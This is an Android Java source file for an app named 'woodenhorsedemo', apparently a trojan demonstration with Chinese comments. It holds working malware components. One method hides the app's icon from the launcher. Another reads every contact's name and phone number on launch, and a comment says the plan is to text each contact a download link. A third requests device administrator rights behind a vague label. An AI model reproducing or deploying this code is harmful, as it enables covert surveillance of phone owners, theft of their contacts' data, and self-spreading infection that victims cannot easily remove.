package mixi.com.woodenhorsedemo;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    static {
        System.loadLibrary("native-lib");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView tv = (TextView) findViewById(R.id.sample_text);
        // tv.setText(stringFromJNI());
        readContacts();
    }

    public native String stringFromJNI();

    /**
     * 隐藏自己
     */
    public void hiddenSelfPackage() {
        /**
         *包名
         * 状态：COMPONENT_ENABLED_STATE_DISABLED 不可用状态
         * 可用状态：COMPONENT_ENBLED_STATE_ENBLE
         * 默认状态：COMPONENT_ENBLED_STATED_DEAFULT
         * 是否杀死自己0,表示杀死
         */
        getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    /**
     * 读取联系人并进行发送消息，然后发送给联系人的链接进行下载
     */
    public void readContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (!query.moveToNext()) {
            query.close();
            return;

        }
        String display_name = query.getString(query.getColumnIndex("display_name"));
        String _id = query.getString(query.getColumnIndex("_id"));
        Cursor contactCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + _id, null, null);
        for (contactCursor.moveToFirst(); !contactCursor.isAfterLast(); contactCursor.moveToNext()) {
            String str2 = contactCursor.getString(contactCursor.getColumnIndex("data1"));
            System.out.println(display_name + "" + str2);
            //sendTextMessage
        }
    }

    /**
     * 成为牛逼的设备管理器
     */
    public void becomeDeviceManage() {
        //第一步 注册一个广播，用于监听权限的变化
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        ComponentName componentName = new ComponentName(this, MiXiDeviceAdminReceiver.class);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "咪嘻咪嘻广播");
        startActivityForResult(intent, 01010);
    }


}